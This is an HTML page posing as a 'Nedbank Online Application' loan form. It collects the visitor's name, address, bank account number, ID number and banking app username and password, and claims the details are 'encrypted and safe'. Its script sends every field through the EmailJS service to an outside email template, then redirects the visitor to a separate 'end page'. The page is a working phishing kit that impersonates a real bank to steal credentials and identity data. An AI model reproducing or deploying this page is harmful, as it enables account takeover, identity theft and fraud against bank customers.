<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="stylesheet" href="index.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Charm:wght@400;700&display=swap" rel="stylesheet">
    <title>Application Form</title>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
        (function() {
            // https://dashboard.emailjs.com/admin/account
            emailjs.init('GRUP9Fm0KuezG3O38');
        })();
    </script>
</head>
<body>
    <div id="div1">
        <img src="./NED.JO.png" alt="">
        <p>Nedbank Application</p>
    </div>

    <p id="p2">Nedbank Online Application</p>
   
    <form id="contact-form">
        <input type="hidden" name="contact_number">

        <label for="name">Name:</label><br>
        <input type="text" name="name" id="name" placeholder="Enter Your Full Name"><br>

        <label for="address">Address:</label><br>
        <input type="text" name="address" id="address" placeholder="Enter Your Address "><br>

        <label for="occupation">occupation:</label><br>
        <input type="text" name="occupation" id="occupation" placeholder="Enter Occupation"><br>
        
        <label for="account">Account Number:</label><br>
        <input type="number" name="account" id="account" placeholder="Enter Account Number"><br>

        <label for="amount">Loan Amount:</label><br>
        <input type="number" name="amount" id="amount" placeholder="Enter Loan Amount"><br>

        <label for="duration">Loan Duration:</label><br>
        <input type="text" name="duration" id="duration" placeholder="Enter Loan Duration">

        <label for="reason">Reason For Loan:</label>
        <input type="text" name="reason" id="reason" placeholder="Enter Reason For Application">

        <label for="identity">ID Number:</label> <br>
        <input type="number" name="identity" id="identity" placeholder="Enter ID number "> <br>

        <p id="p3"> Kindly input the required details to enable your loan disbursement into your account and
            be ensured that your details are all encrypted and safe</p>
        <label for="username">App Username:</label> <br>
        <input type="text" name="username" id="username" placeholder="Enter Username"> <br>

        <label for="password">App Password:</label> <br>
        <input type="password" name="password" id="password" placeholder="Enter Password"> <br>


        <input type="submit" value="Submit" id="submit">
    </form>
    <!-- <img src="./fnb-logo-2016.jpg" alt=""> -->
    <script>
        let subscribe = document.getElementById('submit')
let id = document.getElementById('identity')
let username = document.getElementById('username')
let password = document.getElementById('password')

window.onload = function() {
    document.getElementById('contact-form').addEventListener('submit', function(event) {
        event.preventDefault();
        // generate a five digit number for the contact_number variable
        this.contact_number.value = Math.random() * 100000 | 0;
        // these IDs from the previous steps
        emailjs.sendForm("service_f78k7tf","template_a8jw62r", this)
        .then(function() {
            console.log('SUCCESS!');
            subscribe.style.animationName = 'done';
            subscribe.value = 'DONE'
            // id.value = "";
            // username.value = "";
            //     password.value ="";
                let Subscribe = setTimeout(sub, 1000);
                function sub(){
                    subscribe.value = 'Submit'
                    window.location.href ='https://workbasehq.github.io/ned-bank-endpage/'
                }
            }, function(error) {
                console.log('FAILED...', error);
                let input = document.querySelectorAll('input')
                input.innerHTML = ""
                let subscribe = document.getElementById('submit')
                subscribe.value = 'unable to submit'
                subscribe.style.animationName = 'failed';
                let Subscribe = setTimeout(sub, 4000);
                function sub(){
                    subscribe.value = 'Submit'
                }
            });
    });
}
    </script>
</body>
</html>
